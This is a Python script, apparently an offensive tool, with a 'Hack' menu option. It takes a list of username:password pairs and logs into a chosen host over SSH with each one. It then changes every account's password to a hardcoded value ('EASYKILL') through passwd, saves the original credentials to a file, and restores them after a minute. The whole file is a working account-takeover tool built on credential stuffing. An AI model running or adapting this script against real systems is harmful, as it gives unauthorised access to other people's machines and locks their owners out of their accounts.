import os, paramiko, colorama, time


class Writer:
    def __init__(self):
        pass

    def writeSuccess(self, msg):
        print(f"{colorama.Fore.LIGHTGREEN_EX}" + msg + f"{colorama.Style.RESET_ALL}")

    def writeError(self, msg):
        print(f"{colorama.Fore.RED}" + msg + f"{colorama.Style.RESET_ALL}")

    def writeWarning(self, msg):
        print(f"{colorama.Fore.LIGHTYELLOW_EX}" + msg + f"{colorama.Style.RESET_ALL}")

    def writeRequest(self, msg):
        return f"{colorama.Fore.LIGHTCYAN_EX}" + msg + f"{colorama.Style.RESET_ALL}"

    def writeProposition(self, msg):
        print(f"{colorama.Fore.LIGHTBLUE_EX}" + msg + f"{colorama.Style.RESET_ALL}")

    def writeStep(self, msg):
        print(f"{colorama.Fore.WHITE}" + msg + f"{colorama.Style.RESET_ALL}")


host = "127.0.0.1"
port = 22
newpassword = "EASYKILL"

wr = Writer()


def readData(filee):
    wr.writeStep("[ + ]- Reading data")
    with open(filee) as f:
        lines = f.readlines()
        dictionnary = {}
        for line in lines:
            data = line.split(":")
            if len(data) > 1:
                dictionnary[data[0]] = data[1].replace("\n", "")
        return dictionnary


def formatData(data):
    wr.writeProposition("============> Proposition : Name with space should Have")
    wr.writeProposition("1 - { _ }")
    wr.writeProposition("2 - { - }")
    wr.writeProposition("3 - { Concat }")
    wr.writeProposition("4 - None")
    choice1 = int(input(wr.writeRequest("====> Make a choice:")))

    wr.writeProposition("============> Proposition : Username should start with majiscule")
    choice2 = str(input(wr.writeRequest("====> [yes/no]:")))

    wr.writeProposition("============> Proposition : Password should start with majiscule")
    choice3 = str(input(wr.writeRequest("====> [yes/no]:")))

    wr.writeProposition("============> Proposition : Majiscule Between space name")
    choice4 = str(input(wr.writeRequest("====> [yes/no]:")))

    wr.writeProposition("============> Proposition : Majiscule for all username")
    choice5 = str(input(wr.writeRequest("====> [yes/no]:")))

    wr.writeProposition("============> Proposition : Majiscule for all password")
    choice6 = str(input(wr.writeRequest("====> [yes/no]:")))

    if choice5 == "yes":
        newdata = {}
        for line in data.keys():
            newdata[line.upper()] = data[line]
        data = newdata
    if choice6 == "yes":
        newdata = {}
        for line in data.keys():
            newdata[line] = data[line].upper()
        data = newdata
    if choice3 == "yes":
        for line in data.keys():
            data[line] = data[line].capitalize()

    if choice2 == "yes":
        newdata = {}
        for line in data.keys():
            newdata[line.capitalize()] = data[line]
        data = newdata

    if choice4 == "yes":
        for line in data.keys():
            if " " in data[line]:
                ch = ""
                for name in data[line].split(" "):
                    ch = ch + name.capitalize() + " "
                data[line] = ch[0:len(ch) - 1]
        newdata = {}
        for line in data.keys():
            if " " in line:
                ch = ""
                for name in line.split(" "):
                    ch = ch + name.capitalize() + " "
                newdata[ch[0:len(ch) - 1]] = data[line]
            else:
                newdata[line] = data[line]
        data = newdata

    if choice1 != 4:
        for line in data.keys():
            if " " in data[line]:
                if choice1 == 1:
                    data[line] = data[line].replace(" ", "_")
                elif choice1 == 2:
                    data[line] = data[line].replace(" ", "-")
                elif choice1 == 3:
                    data[line] = data[line].replace(" ", "")

        newdata = {}
        for line in data.keys():
            if " " in line:
                if choice1 == 1:
                    newdata[line.replace(" ", "_")] = data[line]
                elif choice1 == 2:
                    newdata[line.replace(" ", "-")] = data[line]
                elif choice1 == 3:
                    newdata[line.replace(" ", "")] = data[line]
            else:
                newdata[line] = data[line]
        data = newdata
    return data


def editDefaultUserPassword(data):
    wr.writeStep("[ + ] - Editing data")
    return data


def changePassword(data, pss):
    wr.writeStep("[ + ]- Changing password")
    for username in data.keys():
        try:
            wr.writeWarning("=========> Changing password for username " + username + " with password " + pss)
            command = "echo -e \"" + data[username] + "\\\\n" + pss + "\\\\n" + pss + "\" | passwd"
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, port, username, data[username])
            stdin, stdout, stderr = ssh.exec_command(command)
            lines = stdout.readlines()
            wr.writeSuccess("------ Password Changed ------")
        except:
            wr.writeError("[ - ] - Could not connect")


def makeBackups(data):
    wr.writeStep("[ + ] - Making backups")
    os.system("echo >backup.txt")
    with open("backup.txt", "w") as j:
        i = 1
        for key in data.keys():
            if i == len(data.keys()):
                j.write(key + ":" + data[key])
            else:
                j.write(key + ":" + data[key] + "\n")
        j.close()


def backup():
    data = readData("backup.txt")
    wr.writeStep("[ + ] - Backup data")
    for username in data.keys():
        try:
            wr.writeWarning("=========> Changing password for username " + username + " with password " + newpassword)
            command = "echo -e \"" + newpassword + "\\\\n" + data[username] + "\\\\n" + data[username] + "\" | passwd"
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, port, username, newpassword)
            stdin, stdout, stderr = ssh.exec_command(command)
            lines = stdout.readlines()
            wr.writeSuccess("------ Password Changed ------")
        except:
            pass


wr.writeProposition("1 - Hack")
wr.writeProposition("2 - Backup")
i = int(input(wr.writeRequest("====> Choose:")))
if i == 1:
    host = str(input(wr.writeRequest("Enter Host:")))
    port = int(input(wr.writeRequest("Enter Port:")))
    filename = str(input(wr.writeRequest("Enter Filename:")))
    data = editDefaultUserPassword(readData(filename))
    data = formatData(data)
    makeBackups(data)
    changePassword(data, newpassword)
    wr.writeStep("[ ! ] - Back up in 1 min")
    time.sleep(60)
    backup()
elif i == 2:
    host = str(input(wr.writeRequest("Enter Host:")))
    port = int(input(wr.writeRequest("Enter Port:")))
    backup()



